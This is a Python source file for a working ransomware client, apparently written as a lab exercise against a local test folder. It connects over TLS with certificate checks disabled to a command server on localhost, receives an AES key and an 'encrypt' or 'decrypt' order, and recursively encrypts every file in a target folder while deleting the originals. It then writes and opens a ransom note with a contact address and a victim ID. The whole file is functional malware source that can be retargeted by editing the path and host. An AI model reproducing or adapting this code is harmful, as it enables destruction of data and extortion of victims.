import socket
import ssl
import os
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import sys
import struct

#into git

HOST = "127.0.0.1"
PORT = 44444

context = ssl._create_unverified_context()
folder = "D:\\טרוייני בדיקה"


# === helpers for message framing ===
def send_msg(sock, data: bytes):
    length = struct.pack("!I", len(data))
    sock.sendall(length)
    sock.sendall(data)

def recvall(sock, n):
    data = b""
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def recv_msg(sock):
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    msg_len = struct.unpack("!I", raw_len)[0]
    return recvall(sock, msg_len)


# === ransom note simulation ===
def show_ransom_note_encryption():
    note = """
    🔒 All your files have been encrypted!
    Contact: hackers@example.com
    Your victim ID: 142739ddd
    """
    with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
        f.write(note)
    os.system("notepad README_DECRYPT.txt")

def show_ransom_note_decryption():
    note = """
    🔓 All your files have been decrypted!
    Your system is no longer encrypted.
    """
    with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
        f.write(note)
    os.system("notepad README_DECRYPT.txt")


# === file encryption/decryption ===
def Encryption_all_files_in_folder(folder_path, AES_KEY):
    for file_name in os.listdir(folder_path):
        full_path = os.path.join(folder_path, file_name)
        if os.path.isfile(full_path):
            try:
                with open(full_path, "rb") as f:
                    file_data = f.read()
                iv = get_random_bytes(16)
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
                encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
                encrypted_path = full_path + "_"
                with open(encrypted_path, "wb") as f:
                    f.write(iv + encrypted_data)
                os.remove(full_path)
            except Exception:
                continue
        elif os.path.isdir(full_path):
            Encryption_all_files_in_folder(full_path, AES_KEY)

def Decryption_all_files_in_folder(folder_path, AES_KEY):
    for file_name in os.listdir(folder_path):
        full_path = os.path.join(folder_path, file_name)
        if os.path.isfile(full_path):
            try:
                with open(full_path, "rb") as f:
                    file_data = f.read()
                iv = file_data[:16]
                encrypted_data = file_data[16:]
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
                decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
                decrypted_path = full_path.rstrip("_")
                with open(decrypted_path, "wb") as f:
                    f.write(decrypted_data)
                os.remove(full_path)
            except Exception:
                continue
        elif os.path.isdir(full_path):
            Decryption_all_files_in_folder(full_path, AES_KEY)


# === main client ===
def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        with context.wrap_socket(s, server_hostname="anything") as secure_sock:
            secure_sock.connect((HOST, PORT))

            aes_key = recv_msg(secure_sock)
            action = recv_msg(secure_sock).decode()

            if action == "encrypt":
                Encryption_all_files_in_folder(folder, aes_key)
                del aes_key
                show_ransom_note_encryption()
                send_msg(secure_sock, b"the files are encrypted")

            elif action == "decrypt":
                Decryption_all_files_in_folder(folder, aes_key)
                del aes_key
                show_ransom_note_decryption()
                send_msg(secure_sock, b"the files are decrypted")

            sys.exit()


if __name__ == "__main__":
    main()
